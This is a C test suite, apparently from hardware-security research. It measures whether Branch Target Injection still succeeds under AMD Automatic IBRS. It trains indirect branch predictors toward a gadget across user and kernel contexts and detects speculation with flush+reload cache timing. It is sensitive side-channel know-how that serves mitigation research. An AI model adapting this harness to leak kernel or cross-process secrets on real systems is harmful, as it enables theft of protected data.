/**
 * Automatic IBRS BTI
 *
 * That is the impact of Automatic IBRS on BTI? Is is still possible?
 *
 * We consider the attack vectors:
 *  - U -> U (basecase)
 *  - K -> K
 *  - K -> U
 *  - U -> K
 *
 */

#include "flush_reload.h"
#include "jita.h"
#include "kmod/pi.h"
#include "kmod/rap.h"
#include "lib.h"
#include "log.h"
#include "spec_lib.h"
#include "test.h"

#ifdef LOG_TAG
#undef LOG_TAG
#define LOG_TAG LOG_TAG_TEST
#endif

psnip_declare(history, psnip_history);
psnip_declare(src_call_ind, psnip_src_call_ind);
psnip_declare(src_jmp_ind, psnip_src_jmp_ind);
psnip_declare(dst_gadget, psnip_dst_gadget);
psnip_declare(dst_dummy, psnip_dst_dummy);

struct TestCaseData {
    uint32_t seed;
    uint32_t num_cands;
    uint32_t num_rounds;
    uint32_t num_train_rounds;
    jita_ctxt_t *jita_main;
    jita_ctxt_t *jita_gadget;
    jita_ctxt_t *jita_dummy;
    bool train_in_kernel;
    bool signal_in_kernel;
};

void run_spec(void *arg) {
    struct SpecData *data = (struct SpecData *) arg;

    asm volatile("lea return_here%=, %%rax\n\t"
                 "pushq %%rax\n\t"
                 "jmp *%0\n\t"
                 "return_here%=:\n\t" ::"r"(data->spec_prim_p),
                 "c"(data)
                 : "rax", "rdx", "rdi", "rsi", "r8", "memory");
}

static inline void run_spec_user(struct SpecData *data) {
    run_spec(data);
}

static inline void run_spec_kernel(struct SpecData *data) {
    rap_call(run_spec, data);
}

TEST_CASE_ARG(basic, arg) {
    struct TestCaseData *data = (struct TestCaseData *) arg;
    srand(data->seed);

    // struct FrConfig fr = fr_init(8, 6, (size_t[]){0, 1, 2, 3, 5, 10});
    struct FrConfig fr = fr_init(8, 1, NULL);

    stub_t stub_main = stub_init();
    stub_t stub_gadget = stub_init();
    stub_t stub_dummy = stub_init();

    void (*train_f)(struct SpecData *data) =
        data->train_in_kernel ? run_spec_kernel : run_spec_user;
    void (*signal_f)(struct SpecData *data) =
        data->signal_in_kernel ? run_spec_kernel : run_spec_user;

    IBPB();

    AUTO_IBRS_ON();
    // AUTO_IBRS_OFF();

    fr_reset(&fr);

    for (size_t c = 0; c < data->num_cands; c++) {
        jita_allocate(data->jita_main, &stub_main, rand47());
        jita_allocate(data->jita_gadget, &stub_gadget, rand47());
        jita_allocate(data->jita_dummy, &stub_dummy, rand47());

        struct history h1 = get_randomized_history();

        struct SpecData train_data = {
            .spec_prim_p = stub_main.addr,
            .spec_dst_p_p = _ul(&stub_gadget.addr),
            .fr_buf_p = fr.buf2.addr,
            .secret = 0,
            .hist = h1,
        };

        struct SpecData signal_data = {
            .spec_prim_p = stub_main.addr,
            .spec_dst_p_p = _ul(&stub_dummy.addr),
            .fr_buf_p = fr.buf.addr,
            .secret = 1,
            .hist = h1,
        };

        for (size_t r = 0; r < data->num_rounds; r++) {

            for (size_t t = 0; t < data->num_train_rounds; t++) {
                asm("train:\n\t");
                // rap_call(run_spec, &train_data);
                // run_spec(&train_data);
                train_f(&train_data);
            }

            fr_flush(&fr);
            clflush_spec_dst(&signal_data);
            invlpg_spec_dst(&signal_data);
            prefetcht0(&train_data);

            // TODO: disable interrupts and preemption
            asm("signal:\n\t");
            // rap_call(run_spec, &signal_data);
            // run_spec(&signal_data);
            signal_f(&signal_data);

            fr_reload_binned(&fr, r);
        }
        jita_deallocate(data->jita_main, &stub_main);
        jita_deallocate(data->jita_gadget, &stub_gadget);
        jita_deallocate(data->jita_dummy, &stub_dummy);
    }

    fr_print(&fr);

    fr_deinit(&fr);

    TEST_PASS();
}

static struct TestCaseData data1;
static struct TestCaseData data2;
static struct TestCaseData data3;
static struct TestCaseData data4;
static struct TestCaseData data5;
static struct TestCaseData data6;
static struct TestCaseData data7;
static struct TestCaseData data8;

TEST_SUITE() {
    uint32_t seed = get_seed();
    // seed = 4028268922;
    LOG_INFO("Using seed: %u\n", seed);
    pi_init();
    rap_init();

    jita_ctxt_t jita_main_call = jita_init();
    jita_ctxt_t jita_main_jmp = jita_init();
    jita_ctxt_t jita_gadget = jita_init();
    jita_ctxt_t jita_dummy = jita_init();

    jita_push_psnip(&jita_main_call, &psnip_history);
    jita_push_psnip(&jita_main_call, &psnip_history);
    jita_push_psnip(&jita_main_call, &psnip_history);
    jita_push_psnip(&jita_main_call, &psnip_history);
    jita_push_psnip(&jita_main_call, &psnip_history);

    jita_clone(&jita_main_call, &jita_main_jmp);

    jita_push_psnip(&jita_main_call, &psnip_src_call_ind);
    jita_push_psnip(&jita_main_jmp, &psnip_src_jmp_ind);

    jita_push_psnip(&jita_gadget, &psnip_dst_gadget);
    jita_push_psnip(&jita_dummy, &psnip_dst_dummy);

    data1 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 100,
        .jita_main = &jita_main_jmp,
        .jita_gadget = &jita_gadget,
        .jita_dummy = &jita_dummy,
        .train_in_kernel = false,
        .signal_in_kernel = false,
    };

    data2 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 100,
        .jita_main = &jita_main_jmp,
        .jita_gadget = &jita_gadget,
        .jita_dummy = &jita_dummy,
        .train_in_kernel = true,
        .signal_in_kernel = false,
    };

    data3 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 100,
        .jita_main = &jita_main_jmp,
        .jita_gadget = &jita_gadget,
        .jita_dummy = &jita_dummy,
        .train_in_kernel = false,
        .signal_in_kernel = true,
    };

    data4 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 100,
        .jita_main = &jita_main_jmp,
        .jita_gadget = &jita_gadget,
        .jita_dummy = &jita_dummy,
        .train_in_kernel = true,
        .signal_in_kernel = true,
    };

    data5 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 100,
        .jita_main = &jita_main_call,
        .jita_gadget = &jita_gadget,
        .jita_dummy = &jita_dummy,
        .train_in_kernel = false,
        .signal_in_kernel = false,
    };

    data6 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 100,
        .jita_main = &jita_main_call,
        .jita_gadget = &jita_gadget,
        .jita_dummy = &jita_dummy,
        .train_in_kernel = true,
        .signal_in_kernel = false,
    };

    data7 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 100,
        .jita_main = &jita_main_call,
        .jita_gadget = &jita_gadget,
        .jita_dummy = &jita_dummy,
        .train_in_kernel = false,
        .signal_in_kernel = true,
    };

    data8 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 100,
        .jita_main = &jita_main_call,
        .jita_gadget = &jita_gadget,
        .jita_dummy = &jita_dummy,
        .train_in_kernel = true,
        .signal_in_kernel = true,
    };

    RUN_TEST_CASE_ARG(basic, &data1, "UU, jmp");
    RUN_TEST_CASE_ARG(basic, &data2, "KU, jmp");
    RUN_TEST_CASE_ARG(basic, &data3, "UK, jmp");
    RUN_TEST_CASE_ARG(basic, &data4, "KK, jmp");
    RUN_TEST_CASE_ARG(basic, &data5, "UU, call");
    RUN_TEST_CASE_ARG(basic, &data6, "KU, call");
    RUN_TEST_CASE_ARG(basic, &data7, "UK, call");
    RUN_TEST_CASE_ARG(basic, &data8, "KK, call");

    pi_deinit();
    rap_deinit();

    return 0;
}
